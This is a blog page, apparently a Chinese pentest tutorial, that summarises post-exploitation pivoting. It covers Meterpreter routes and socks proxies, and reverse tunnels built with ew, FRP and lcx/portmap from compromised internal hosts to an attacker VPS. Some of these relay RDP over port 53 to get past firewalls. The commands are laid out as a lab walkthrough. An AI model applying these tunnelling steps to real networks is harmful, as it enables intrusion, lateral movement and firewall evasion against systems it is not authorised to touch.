@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Meterpreter添加路由12345run get_local_subnets #查看路由段run autoroute -s 192.168.52.0&#x2F;24  #添加路由至本地run autoroute -p #打印当前路由信息  添加路由的目的是为了让msfF其他模块能访问内网的其他主机，即往内网的攻击流量都通过已渗透的这台目标主机的meterpreter会话来传递。 设置代理添加socks">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透中端口转发和代理总结">
+<meta property="og:url" content="http://example.com/2023/10/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="踟蹰者的歌">
+<meta property="og:description" content="Meterpreter添加路由12345run get_local_subnets #查看路由段run autoroute -s 192.168.52.0&#x2F;24  #添加路由至本地run autoroute -p #打印当前路由信息  添加路由的目的是为了让msfF其他模块能访问内网的其他主机，即往内网的攻击流量都通过已渗透的这台目标主机的meterpreter会话来传递。 设置代理添加socks">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-10-01T15:29:53.000Z">
+<meta property="article:modified_time" content="2024-01-14T09:22:12.112Z">
+<meta property="article:author" content="yu1e">
+<meta property="article:tag" content="Pentest">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>内网渗透中端口转发和代理总结</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2023/10/01/%E4%BD%BF%E7%94%A8minikatz%E5%92%8Cwce%E8%BF%9B%E8%A1%8CWindows%E5%87%AD%E8%AF%81%E6%8F%90%E5%8F%96/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/10/01/%E5%8A%A8%E6%80%81Shellcode%E6%B3%A8%E5%85%A5&Powershell%E6%B7%B7%E6%B7%86/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/&text=内网渗透中端口转发和代理总结"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/&title=内网渗透中端口转发和代理总结"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/&is_video=false&description=内网渗透中端口转发和代理总结"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网渗透中端口转发和代理总结&body=Check out this article: http://example.com/2023/10/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/&title=内网渗透中端口转发和代理总结"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/&title=内网渗透中端口转发和代理总结"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/&title=内网渗透中端口转发和代理总结"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/&title=内网渗透中端口转发和代理总结"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/&name=内网渗透中端口转发和代理总结&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/&t=内网渗透中端口转发和代理总结"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Meterpreter"><span class="toc-number">1.</span> <span class="toc-text">Meterpreter</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="toc-number">1.1.</span> <span class="toc-text">添加路由</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">设置代理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%98%A0%E5%B0%84%E5%8D%95%E4%B8%AA%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.3.</span> <span class="toc-text">映射单个端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ew%E6%90%AD%E5%BB%BA%E4%BB%A3%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">ew搭建代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FRP%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">FRP反向代理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FRP%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%85%8D%E7%BD%AE"><span class="toc-number">3.1.</span> <span class="toc-text">FRP服务端配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FRP%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E9%85%8D%E7%BD%AE"><span class="toc-number">3.2.</span> <span class="toc-text">FRP客户端的配置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LCX"><span class="toc-number">4.</span> <span class="toc-text">LCX</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">4.1.</span> <span class="toc-text">Windows使用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#lcx-%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">4.1.1.</span> <span class="toc-text">lcx 内网端口转发</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">4.1.2.</span> <span class="toc-text">本地端口转发</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E7%89%88%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">4.2.</span> <span class="toc-text">Linux版使用方法</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        内网渗透中端口转发和代理总结
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">yu1e</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-01T15:29:53.000Z" class="dt-published" itemprop="datePublished">2023-10-01</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Pentest/" rel="tag">Pentest</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h3 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h3><h4 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets #查看路由段</span><br><span class="line"></span><br><span class="line">run autoroute -s 192.168.52.0/24  #添加路由至本地</span><br><span class="line"></span><br><span class="line">run autoroute -p #打印当前路由信息</span><br></pre></td></tr></table></figure>
+
+<p>添加路由的目的是为了让msfF其他模块能访问内网的其他主机，即往内网的攻击流量都通过已渗透的这台目标主机的meterpreter会话来传递。</p>
+<h4 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h4><p>添加socks4a代理的目的是为了让其他软件更方便的访问到内网的其他主机的服务，添加路由一定要在挂代理之前，因为代理需要用到路由功能</p>
+<p>msf中设置socks4a代理配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks4a</span><br><span class="line"></span><br><span class="line">set srvhost &lt;local_ip&gt;</span><br></pre></td></tr></table></figure>
+
+<p>修改本地代理的配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure>
+
+<p>测试是否成功，这里proxychains是无法代理icmp流量的，所以ping是没有用的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -p 1-1000 -Pn -sT 内网主机的IP</span><br></pre></td></tr></table></figure>
+
+<h4 id="映射单个端口"><a href="#映射单个端口" class="headerlink" title="映射单个端口"></a>映射单个端口</h4><p>porfwd可以反弹单个端口到本地，并且监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 2222 -r 10.1.1.129 -p 3389</span><br></pre></td></tr></table></figure>
+
+<p>把10.1.1.129的3389端口映射到本地的2222端口，连接本地2222端口即可连接目标的3389</p>
+<h3 id="ew搭建代理"><a href="#ew搭建代理" class="headerlink" title="ew搭建代理"></a>ew搭建代理</h3><p>一台外网vps：110.42.229.X<br>一台内网靶机：192.168.1.5（3389开放）</p>
+<p>vps执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64 -s rcsocks -l 6666 -e 6667</span><br></pre></td></tr></table></figure>
+
+<p>让公网服务器监听6666和6667端口，等待攻击者机器访问6666端口，目标机器访问6667端口</p>
+<p>内网机器执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s rssocks -d vps的ip -e 6667</span><br></pre></td></tr></table></figure>
+
+<p>然后设置代理为vps的6666端口即可</p>
+<h3 id="FRP反向代理"><a href="#FRP反向代理" class="headerlink" title="FRP反向代理"></a>FRP反向代理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">公网VPS：104.168.xxx.xxx（部署FRP服务端）</span><br><span class="line"></span><br><span class="line">win7（部署FRP客户端）：外网IP192.168.92.130，内网IP192.168.52.143</span><br><span class="line"></span><br><span class="line">内网win2003：192.168.52.141</span><br><span class="line"></span><br><span class="line">内网win2008域控：192.168.52.138</span><br><span class="line"></span><br><span class="line">攻击机（物理机）win10</span><br></pre></td></tr></table></figure>
+
+<p>要实现 Win10 物理机通过 Win7 跳板机的代理成功访问到内网 Win2008 的 Web 服务</p>
+<p>FRP 代理工具可以直接在 Github 下载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/fatedier/frp</span><br></pre></td></tr></table></figure>
+
+<p>frp 的工作流程 —— 在服务端部署 frps，在要访问的 内网机器（或者跳板机）上部署 frpc，实现服务端对该主机的反向代理，接着便可以通过访问服务端来实现对该内网主机的远程访问（或者借助跳板机访问内网）</p>
+<h4 id="FRP服务端配置"><a href="#FRP服务端配置" class="headerlink" title="FRP服务端配置"></a>FRP服务端配置</h4><p>在VPS上上传FRP</p>
+<p>关键文件如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">├── frpc          #frp客户端执行程序</span><br><span class="line">├── frpc_full.ini </span><br><span class="line">├── frpc.ini      #frp客户端配置文件</span><br><span class="line">├── frps          #frp服务端执行程序</span><br><span class="line">├── frps_full.ini├── frps.ini      #frp服务端配置文件</span><br><span class="line">└── LICENSE</span><br></pre></td></tr></table></figure>
+
+<p>frp 服务默认不设置连接密码，frps.ini 文件默认只设置了端口</p>
+<p>可以修改服务端配置文件 frps.ini 来配置代理的连接密码，token就是密码</p>
+<p>执行如下命令开始运行 FRP 服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini </span><br></pre></td></tr></table></figure>
+
+<h4 id="FRP客户端的配置"><a href="#FRP客户端的配置" class="headerlink" title="FRP客户端的配置"></a>FRP客户端的配置</h4><p>将对应版本的 FRP 工具下载到 Win7 跳板机上并解压缩，同样的修改 FRP 客户端配置文件 frpc.ini 来设置服务端的 IP 地址、端口、连接密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]server_addr = 104.168.***.*** #VPS服务器的 IP</span><br><span class="line">server_port = 7000            #VPS服务器上设置的 FRP 服务绑定端口</span><br><span class="line">token = ftp1234               #VPS服务端设置的 FRP 服务连接密码</span><br><span class="line"></span><br><span class="line">[socks5]      #这个是反向代理的名称，可以随意设置</span><br><span class="line">type = tcp    #socks5 是 TCP 协议的</span><br><span class="line">remote_port = 6666   #指定建立的反向代理的连接端口</span><br><span class="line">plugin = socks5      #指定建立 socks5 代理隧道</span><br><span class="line">use_encryption = true</span><br><span class="line">use_compression = true</span><br></pre></td></tr></table></figure>
+
+<p>执行命令启动客户端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc.exe -c frpc.ini </span><br></pre></td></tr></table></figure>
+
+<p>此时查看 VPS 服务器监听的 7000 端口已成功与客户端连接，同时开启了 6666 端口并建立了 socks5 代理通道</p>
+<p>在 Win10 物理机的谷歌浏览器设置代理，让 Win10 的谷歌浏览器流量走 VPS 建立的 FRP socks5 代理，即可访问到内网域控主机的 Web 服务，成功实现内网穿透</p>
+<h3 id="LCX"><a href="#LCX" class="headerlink" title="LCX"></a>LCX</h3><p>lcx.exe是一个端口转发工具，有Windows版和Linux版两个版本，Windows版是lcx.exe,Linux版为portmap</p>
+<h4 id="Windows使用方法"><a href="#Windows使用方法" class="headerlink" title="Windows使用方法"></a>Windows使用方法</h4><p>lcx有两大功能：</p>
+<p>1）端口转发(listen和slave成对使用)</p>
+<p>2）端口映射(tran)</p>
+<h5 id="lcx-内网端口转发"><a href="#lcx-内网端口转发" class="headerlink" title="lcx 内网端口转发"></a>lcx 内网端口转发</h5><p>内网主机上执行：lcx.exe –slave 公网主机ip 公网主机端口 内网主机ip 内网主机端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave 公网主机ip 4444 127.0.0.1 3389</span><br></pre></td></tr></table></figure>
+
+<p>意思是把内网主机的 3389 端口转发到具有公网ip主机的 4444 端口</p>
+<p>公网主机 上执行 Lcx.exe –listen 公网主机端口1 公网主机端口2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe –listen 4444 5555</span><br></pre></td></tr></table></figure>
+
+<p>意思是监听公网主机本机的 4444 端口请求，并将来自 4444 端口的请求传送给 5555 端口</p>
+<p>此时，RDP 连接，如果是在公网主机上操作，只需要连接 127.0.0.1:5555；如果是在本地主机上操作，则输入公网主机ip:5555。</p>
+<h5 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h5><p>由于防火墙限制，部分端口如3389无法通过防火墙，此时可以将该目标主机的3389端口透传到防火墙允许的其他端口，如53端口</p>
+<p>目标主机上执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -tran 53 目标主机ip 3389</span><br></pre></td></tr></table></figure>
+
+<p>这时我们可以直接远程桌面连接到到 目标主机IP:53</p>
+<h4 id="Linux版使用方法"><a href="#Linux版使用方法" class="headerlink" title="Linux版使用方法"></a>Linux版使用方法</h4><p>先在具有公网ip的主机上执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./portmap -m 2 -p1 6666 -h2 公网主机ip -p2 7777</span><br></pre></td></tr></table></figure>
+
+<p>意思是监听来自6666端口的请求，将其转发到7777端口</p>
+<p>再在内网主机上执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 公网主机ip -p2 6666</span><br></pre></td></tr></table></figure>
+
+<p>意思就是将内网主机22端口的流量转发到公网主机的6666端口。</p>
+<p>然后在Linux系统命令行下执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh 公网主机ip 7777</span><br></pre></td></tr></table></figure>
+
+<p>即可连接内网主机。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Meterpreter"><span class="toc-number">1.</span> <span class="toc-text">Meterpreter</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="toc-number">1.1.</span> <span class="toc-text">添加路由</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">设置代理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%98%A0%E5%B0%84%E5%8D%95%E4%B8%AA%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.3.</span> <span class="toc-text">映射单个端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ew%E6%90%AD%E5%BB%BA%E4%BB%A3%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">ew搭建代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FRP%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">FRP反向代理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FRP%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%85%8D%E7%BD%AE"><span class="toc-number">3.1.</span> <span class="toc-text">FRP服务端配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FRP%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E9%85%8D%E7%BD%AE"><span class="toc-number">3.2.</span> <span class="toc-text">FRP客户端的配置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LCX"><span class="toc-number">4.</span> <span class="toc-text">LCX</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">4.1.</span> <span class="toc-text">Windows使用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#lcx-%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">4.1.1.</span> <span class="toc-text">lcx 内网端口转发</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">4.1.2.</span> <span class="toc-text">本地端口转发</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E7%89%88%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">4.2.</span> <span class="toc-text">Linux版使用方法</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/&text=内网渗透中端口转发和代理总结"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/&title=内网渗透中端口转发和代理总结"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/&is_video=false&description=内网渗透中端口转发和代理总结"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网渗透中端口转发和代理总结&body=Check out this article: http://example.com/2023/10/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
